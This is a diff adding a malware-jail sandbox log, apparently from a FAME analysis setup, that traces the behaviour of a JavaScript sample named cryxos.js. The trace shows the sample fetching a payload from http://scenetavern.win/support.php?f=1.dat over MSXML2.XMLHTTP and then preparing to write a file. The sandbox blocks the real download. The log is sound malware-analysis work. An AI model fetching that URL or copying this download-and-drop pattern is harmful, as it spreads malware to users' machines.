@@ -1,0 +1,59 @@
+10 Sep 20:24:05 - mailware-jail, a malware sandbox ver. 0.15
+10 Sep 20:24:05 - ------------------------
+10 Sep 20:24:05 - Arguments: /home/maik/gitHub/TFM/fame/storage/c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59/cryxos.js
+10 Sep 20:24:05 - Sandbox environment sequence: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js,fame/modules/community/processing/malware_jail/malware-jail/env/eval.js,fame/modules/community/processing/malware_jail/malware-jail/env/function.js,fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js,fame/modules/community/processing/malware_jail/malware-jail/env/browser.js,fame/modules/community/processing/malware_jail/malware-jail/env/agents.js,fame/modules/community/processing/malware_jail/malware-jail/env/other.js,fame/modules/community/processing/malware_jail/malware-jail/env/console.js
+10 Sep 20:24:05 - Malware files: /home/maik/gitHub/TFM/fame/storage/c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59/cryxos.js
+10 Sep 20:24:05 - Execution timeout set to: 60 seconds
+10 Sep 20:24:05 - Output file for sandbox dump: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+10 Sep 20:24:05 - Output directory for generated files: fame/modules/community/processing/malware_jail/malware-jail/output/
+10 Sep 20:24:05 - Download from remote server: No
+10 Sep 20:24:05 - ==> Preparing Sandbox environment.
+10 Sep 20:24:05 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js quitely
+10 Sep 20:24:05 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/eval.js quitely
+10 Sep 20:24:05 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/function.js quitely
+10 Sep 20:24:05 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js quitely
+10 Sep 20:24:05 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/browser.js quitely
+10 Sep 20:24:05 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/agents.js quitely
+10 Sep 20:24:05 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/other.js quitely
+10 Sep 20:24:05 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/console.js quitely
+10 Sep 20:24:05 - ==> Executing malware file(s). =========================================
+10 Sep 20:24:05 -  => Executing: /home/maik/gitHub/TFM/fame/storage/c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59/cryxos.js verbosely, reporting silent catches
+10 Sep 20:24:05 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/_home_maik_gitHub_TFM_fame_storage_c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59_cryxos.js
+10 Sep 20:24:05 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/tr__home_maik_gitHub_TFM_fame_storage_c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59_cryxos.js
+10 Sep 20:24:05 - WScript.scriptfullname = (string) '/home/maik/gitHub/TFM/fame/storage/c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59/cryxos.js'
+10 Sep 20:24:05 - WScript.arguments = (object) '/home/maik/gitHub/TFM/fame/storage/c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59/cryxos.js,xyz'
+10 Sep 20:24:05 - ActiveXObject(MSXML2.XMLHTTP)
+10 Sep 20:24:05 - new MSXML2.XMLHTTP[14]
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14].onreadystatechange = (undefined) 'undefined'
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14].open(GET,http://scenetavern.win/support.php?f=1.dat,false)
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14].method = (string) 'GET'
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14].url = (string) 'http://scenetavern.win/support.php?f=1.dat'
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14].async = (boolean) 'false'
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14].send(undefined)
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14] Not sending data, if you want to interact with remote server, set --down
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14].status = (number) '200'
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14].readystate = (number) '4'
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14].send(undefined) finished
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14].status.get() => (number) '200'
+10 Sep 20:24:05 - MSXML2.XMLHTTP[14].responsebody.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 20:24:05 - ActiveXObject(Scripting.FileSystemObject)
+10 Sep 20:24:05 - new Scripting.FileSystemObject[15]
+10 Sep 20:24:05 - new DriveObject[16](C:)
+10 Sep 20:24:05 - DriveObject[16](C:).name = (string) 'C:'
+10 Sep 20:24:05 - new Collection[17]
+10 Sep 20:24:05 - >>> Silencing catch ReferenceError: nombreArchivo_antes_wime is not defined
+    at crearArchivoEnCarpeta_Antes_qdwsFVTbp (/home/maik/gitHub/TFM/fame/storage/c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59/cryxos.js:119:51)
+    at creaYEscribeArchivo_Antes_KvgoaW (/home/maik/gitHub/TFM/fame/storage/c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59/cryxos.js:27:38)
+    at /home/maik/gitHub/TFM/fame/storage/c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59/cryxos.js:152:9
+    at /home/maik/gitHub/TFM/fame/storage/c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59/cryxos.js:51:24
+    at hacerPeticionGET_Antes_xba (/home/maik/gitHub/TFM/fame/storage/c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59/cryxos.js:100:20)
+    at entrada_Antes_UV (/home/maik/gitHub/TFM/fame/storage/c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59/cryxos.js:48:9)
+    at /home/maik/gitHub/TFM/fame/storage/c5bf2c1f1d77b7e04de1888b30b57a4f0cec1d65914561a744c253da51607e59/cryxos.js:150:1
+    at ContextifyScript.Script.runInContext (vm.js:35:29)
+    at Object.runInContext (vm.js:89:6)
+    at run_in_ctx (/home/maik/gitHub/TFM/fame/fame/modules/community/processing/malware_jail/malware-jail/jailme.js:322:16)
+10 Sep 20:24:05 - ==> Cleaning up sandbox.
+10 Sep 20:24:05 - ==> Script execution finished, dumping sandbox environment to a file.
+10 Sep 20:24:05 - The sandbox context has been  saved to: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
